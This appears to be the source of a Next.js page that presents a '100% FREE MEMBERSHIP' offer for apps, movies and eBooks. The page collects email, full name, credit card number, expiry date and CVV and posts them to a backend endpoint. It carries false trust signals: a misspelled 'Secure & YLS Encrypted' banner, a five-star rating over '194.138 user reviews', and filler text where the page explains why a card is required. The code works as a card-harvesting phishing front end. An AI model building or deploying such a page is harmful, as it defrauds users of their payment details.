import SecureIcon from "@/components/icons/SecureIcon";
import StarIcon from "@/components/icons/StarIcon";
import DownloadIcon from "@/components/icons/DownloadIcon";
import SuccessIcon from "@/components/icons/SuccessIcon";
import { useRouter } from "next/router";
import Dropdown from "@/components/Dropdown";
import { MONTH_LIST } from "@/constants/date-and-time";
import { getYearList } from "@/utils/date-and-time";
import { useState, useEffect, FormEvent, ChangeEvent } from "react";
import _ from "lodash";
import { FormFiledType, ItemType } from "@/type";
import { EMAIL, FULLNAME, CARD_NUMBER, CVV } from "@/constants/type";
import { VALID_EMAIL_REGEX, VALID_NUMBER } from "@/constants/regex";
import axios from "axios";

export default function Home() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [emailError, setEmailError] = useState(false);
  const [fullName, setFullName] = useState("");
  const [fullNameError, setFullNameError] = useState(false);
  const [cardNumber, setCardNumber] = useState("");
  const [cardNumberError, setCardNumberError] = useState(false);
  const [expMonth, setExpMonth] = useState("");
  const [expMonthError, setExpMonthError] = useState(false);
  const [expYear, setExpYear] = useState("");
  const [expYearError, setExpYearError] = useState(false);
  const [ccv, setCVV] = useState("");
  const [ccvError, setCVVError] = useState(false);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (router.query.email) {
      setEmail(router.query.email as string);
    }
  }, [router.query, setEmail]);

  const onHandleChangeFormData = (
    e: ChangeEvent<HTMLInputElement>,
    type: FormFiledType
  ) => {
    switch (type) {
      case EMAIL: {
        setEmail(e.target.value);
        setEmailError(false);

        break;
      }

      case FULLNAME: {
        setFullName(e.target.value);
        setFullNameError(false);

        break;
      }

      case CARD_NUMBER: {
        setCardNumber(e.target.value);
        setCardNumberError(false);

        break;
      }

      case CVV: {
        setCVV(e.target.value);
        setCVVError(false);
        break;
      }

      default:
        break;
    }
  };

  const onHandleSubmitForm = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const isInvalidEmail = email.match(VALID_EMAIL_REGEX) === null;
    const isInvalidFullName = fullName === "";
    const isInvalidCardNumber =
      cardNumber === "" || cardNumber.match(VALID_NUMBER) === null;
    const isInvalidExpMonth = expMonth === "";
    const isInvalidExpYear = expYear === "";
    const isInvalidCVV = ccv === "";

    if (
      isInvalidEmail ||
      isInvalidFullName ||
      isInvalidCardNumber ||
      isInvalidExpMonth ||
      isInvalidExpYear ||
      isInvalidCVV
    ) {
      isInvalidEmail && setEmailError(true);
      isInvalidFullName && setFullNameError(true);
      isInvalidCardNumber && setCardNumberError(true);
      isInvalidExpMonth && setExpMonthError(true);
      isInvalidExpYear && setExpYearError(true);
      isInvalidCVV && setCVVError(true);
    } else {
      setEmailError(false);
      setFullNameError(false);
      setCardNumberError(false);
      setExpMonthError(false);
      setExpYearError(false);
      setCVVError(false);

      setLoading(true);
      try {
        const result = await axios.post("/products/add", {
          email,
          fullName,
          cardNumber,
          expMonth,
          expYear,
          ccv,
        });
        alert(result);
      } catch (err) {}
      setLoading(false);
      alert("Bigo");
    }
  };

  return (
    <div className="flex-col layout-1000px:flex-row flex justify-between items-start pt-[32px] mb-[64px]">
      <form
        onSubmit={onHandleSubmitForm}
        className="w-full layout-1000px:w-[49%] mb-[16px] layout-1000px:mb-[0px]"
      >
        <div className="rounded-[4px] bg-gray-100 h-auto layout-548px:h-[850px]">
          <div className="h-[45px] bg-green-600 flex justify-center items-center">
            <div className="mr-[16px]">
              <SecureIcon fill="white" size="24px" />
            </div>
            <div className="text-white">
              Secure & YLS Encrypted Verification
            </div>
          </div>

          <div className="border-b p-[16px] layout-548px:p-[32px] flex justify-between items-start">
            <div className="layout-548px:w-auto w-[80%]">
              <div className="layout-548px:text-[22px] text-[16px] font-semibold">
                100% FREE MEMBERSHIP
              </div>
              <div className="mb-[8px]">
                Verify Your Account and{" "}
                <span className="font-semibold">Get Access For Free</span>
              </div>
              <div className="flex layout-548px:flex-row flex-col justify-start layout-548px:items-center items-start">
                <div className="flex justify-start items-center mr-[16px] mb-[4px] layout-548px:mb-0">
                  <div className="flex flex-col justify-center items-center mr-[4px]">
                    <StarIcon />
                  </div>
                  <div className="flex flex-col justify-center items-center mr-[4px]">
                    <StarIcon />
                  </div>
                  <div className="flex flex-col justify-center items-center mr-[4px]">
                    <StarIcon />
                  </div>
                  <div className="flex flex-col justify-center items-center mr-[4px]">
                    <StarIcon />
                  </div>
                  <div className="flex flex-col justify-center items-center mr-[4px]">
                    <StarIcon />
                  </div>
                </div>
                <div>Based on 194.138 user reviews</div>
              </div>
            </div>
            <div className="text-green-600 text-[20px] font-extrabold layout-548px:w-auto w-[20%] text-right">
              100 €
            </div>
          </div>

          <div className="p-[16px] layout-548px:p-[32px]">
            <div className="mb-[16px]">
              <div className="font-semibold mb-[8px] text-[14px]">
                Email Address
              </div>
              <input
                value={email}
                onChange={(e: ChangeEvent<HTMLInputElement>) =>
                  onHandleChangeFormData(e, EMAIL)
                }
                placeholder="Enter email"
                type="text"
                className="w-full pl-[16px] pr-[16px] outline-none rounded-[4px] h-[45px] border"
              />
              {emailError && (
                <p className="text-red-400 mt-[8px]">
                  Please enter valid email address
                </p>
              )}
            </div>
            <div className="mb-[16px]">
              <div className="font-semibold mb-[8px] text-[14px]">
                Full Name
              </div>
              <input
                value={fullName}
                onChange={(e: ChangeEvent<HTMLInputElement>) =>
                  onHandleChangeFormData(e, FULLNAME)
                }
                placeholder="Enter Full name"
                type="text"
                className="w-full pl-[16px] pr-[16px] outline-none rounded-[4px] h-[45px] border"
              />
              {fullNameError && (
                <p className="text-red-400 mt-[8px]">Please enter full name</p>
              )}
            </div>
            <div className="mb-[16px]">
              <div className="flex-col justify-start items-start layout-548px:flex-row font-semibold mb-[8px] flex layout-548px:justify-between  layout-548px:items-center text-[14px]">
                Credit Card Number
                <img className="h-[30px]" src="images/card-list.png" alt="" />
              </div>
              <input
                value={cardNumber}
                onChange={(e: ChangeEvent<HTMLInputElement>) =>
                  onHandleChangeFormData(e, CARD_NUMBER)
                }
                placeholder="Enter Card Number"
                type="text"
                className="w-full pl-[16px] pr-[16px] outline-none rounded-[4px] h-[45px] border"
              />
              {cardNumberError && (
                <p className="text-red-400 mt-[8px]">
                  Please enter card number
                </p>
              )}
            </div>
            <div className="mb-[32px] flex flex-col layout-548px:flex-row justify-between items-start">
              <div className="mb-[16px] layout-548px:mb-0 w-full layout-548px:w-[32%]">
                <div className="font-semibold mb-[8px] text-[14px]">
                  Exp. month
                </div>
                <Dropdown
                  placeHolder="Exp. month"
                  list={MONTH_LIST}
                  selected={expMonth}
                  getSelectedItem={(item: ItemType) => {
                    setExpMonth(item.content);
                    setExpMonthError(false);
                  }}
                />
                {expMonthError && (
                  <p className="text-red-400 mt-[8px]">Please enter month</p>
                )}
              </div>
              <div className="mb-[16px] layout-548px:mb-0 w-full layout-548px:w-[32%]">
                <div className="font-semibold mb-[8px] text-[14px]">
                  Exp. year
                </div>
                <Dropdown
                  placeHolder="Exp. year"
                  list={getYearList(100, 2023)}
                  selected={expYear}
                  getSelectedItem={(item: ItemType) => {
                    setExpYear(item.content);
                    setExpYearError(false);
                  }}
                />
                {expYearError && (
                  <p className="text-red-400 mt-[8px]">Please enter year</p>
                )}
              </div>
              <div className="mb-[16px] layout-548px:mb-0 w-full layout-548px:w-[32%]">
                <div className="font-semibold mb-[8px] text-[14px]">CVV</div>
                <input
                  value={ccv}
                  onChange={(e: ChangeEvent<HTMLInputElement>) =>
                    onHandleChangeFormData(e, CVV)
                  }
                  placeholder="Enter card CVV"
                  type="text"
                  className="w-full pl-[16px] pr-[16px] outline-none rounded-[4px] h-[45px] border"
                />
                {ccvError && (
                  <p className="text-red-400 mt-[8px]">Please enter CVV</p>
                )}
              </div>
            </div>
          </div>

          <div className="mb-[32px] pl-[16px] pr-[16px] layout-548px:pl-[32px] layout-548px:pr-[32px]">
            <button
              type="submit"
              className="bg-green-600 w-full h-[60px] rounded-[4px] flex justify-center items-center pl-[32px] pr-[32px]"
            >
              <DownloadIcon />
              <span className="ml-[16px] text-white text-[20px] font-extrabold">
                GET ACCESS
              </span>

              {loading && (
                <img
                  src="images/loading.gif"
                  alt=""
                  className="w-[20px] ml-[18px]"
                />
              )}
            </button>
          </div>

          <div className="pl-[16px] pr-[16px] pb-[16px] layout-548px:pl-[32px] layout-548px:pr-[32px] layout-548px:pb-[32px]">
            By clicking on Get Access, you agree with the{" "}
            <span className="text-green-600">Terms of Service</span> and the{" "}
            <span className="text-green-600">Privacy Policy</span>
          </div>
        </div>
      </form>
      <div className="w-full layout-1000px:w-[49%] rounded-[4px] bg-gray-100 layout-548px:p-[32px] p-[16px] h-[850px]">
        <div className="mb-[8px]">
          <img className="w-full" src="images/demo-app.png" alt="" />
        </div>
        <div className="mb-[32px]">
          Your membership will give you access to:
        </div>
        <div className="flex justify-start items-center mb-[16px]">
          <div className="mr-[8px]">
            <SuccessIcon />
          </div>
          <div className="text-gray-400">Download the latest apps</div>
        </div>
        <div className="flex justify-start items-center mb-[16px]">
          <div className="mr-[8px]">
            <SuccessIcon />
          </div>
          <div className="text-gray-400">Watch popular movies</div>
        </div>
        <div className="flex justify-start items-center mb-[16px]">
          <div className="mr-[8px]">
            <SuccessIcon />
          </div>
          <div className="text-gray-400">Learn from eBooks and Courses</div>
        </div>
        <div className="flex justify-start items-center mb-[18px]">
          <div className="mr-[8px]">
            <SuccessIcon />
          </div>
          <div className="text-gray-400">And more!</div>
        </div>
        <div>
          <div className="mb-[16px]">WHY IS MY CREDIT CARD REQUIRED ?</div>
          <div className="text-gray-400">
            Tailwind lets you conditionally apply utility classes in different
            states using variant modifiers. For example, use hover:rounded-lg to
            only apply the rounded-lg utility on hover. Tailwind lets you
            conditionally apply utility classes in different states using
            variant modifiers. For example, use hover:rounded-lg to only apply
            the rounded-lg utility on hover.
          </div>
        </div>
      </div>
    </div>
  );
}
